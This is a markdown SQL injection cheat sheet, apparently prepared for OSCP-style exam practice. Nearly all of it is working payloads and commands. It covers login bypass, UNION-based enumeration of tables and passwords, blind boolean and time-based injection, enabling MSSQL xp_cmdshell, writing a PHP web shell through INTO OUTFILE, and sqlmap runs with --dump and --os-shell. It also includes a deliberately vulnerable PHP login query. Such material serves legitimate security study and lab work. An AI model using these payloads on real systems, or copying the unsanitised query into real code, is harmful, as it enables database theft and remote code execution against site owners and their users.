# SQL Injection Reference Guide

## SQL Basics

### Common SQL Commands
```sql
SELECT * FROM users WHERE user_name='leon';
SELECT version();               -- Shows DB version
SELECT system_user();           -- Current SQL user
SHOW DATABASES;                 -- List databases
```
Default port of MySQL: `3306`

### MySQL Login Example
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

### PHP Vulnerable Example
```php
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

## Manual SQL Injection

### Error-Based
```sql
'offsec' OR 1=1 --
' OR 1=1 IN (SELECT @@version) --
' OR 1=1 IN (SELECT password FROM users) --
' OR 1=1 IN (SELECT password FROM users WHERE username='admin') --
```

### UNION-Based
```sql
' ORDER BY 1 --
%' UNION SELECT 'a1', 'a2', 'a3', NULL, NULL --
%' UNION SELECT database(), user(), @@version, NULL, NULL --
' UNION SELECT NULL, table_name, column_name, table_schema, NULL FROM information_schema.columns WHERE table_schema=database() --
```

### Blind SQL Injection

#### Boolean-Based
```http
http://<target>/blindsqli.php?user=offsec' AND 1=1 --
```

#### Time-Based
```http
http://<target>/blindsqli.php?user=offsec' AND IF(1=1, SLEEP(3), 'false') --
```

## Code Execution

### MSSQL with xp_cmdshell
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

### MySQL File Write Exploit
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL, NULL INTO OUTFILE "/var/www/html/tmp/webshell.php" --
```
Access via: `webshell.php?cmd=<command>`

## sqlmap Examples

### Basic Usage
```bash
sqlmap -u "http://<target>?user=1" -p user
sqlmap -u "http://<target>?user=1" -p user --dump
```

### With POST Request
```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

---

## Exam-Useful Payloads

### Classic Login Bypass
```sql
' OR 1=1 --
```

### Table & Column Enumeration
```sql
' UNION SELECT NULL, table_name, column_name, table_schema, NULL FROM information_schema.columns WHERE table_schema=database() --
```

### DB Information
```sql
' UNION SELECT database(), user(), @@version, NULL, NULL --
```

### Web Shell (MySQL)
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL, NULL INTO OUTFILE "/var/www/html/tmp/webshell.php" --
```

### Boolean Test (Blind)
```http
http://<target>?user=offsec' AND 1=1 --
```

### Time Delay (Blind)
```http
http://<target>?user=offsec' AND IF(1=1, SLEEP(3), 'false') --
```

---

Prepared for OSCP-style manual SQL injection attacks.